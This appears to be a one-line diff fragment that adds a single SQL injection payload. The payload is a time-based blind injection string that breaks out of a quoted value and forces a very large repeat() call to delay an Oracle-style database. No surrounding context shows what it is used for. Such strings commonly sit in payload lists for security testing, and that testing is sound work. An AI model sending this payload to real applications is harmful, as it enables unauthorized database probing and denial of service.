@@ -1,0 +1,1 @@
+1'||(select 'jfxs' from dual where 5485=5485 and char(109)||char(79)||char(70)||char(90)=regexp_substring(repeat(right(char(5012),0),5000000000),null)--
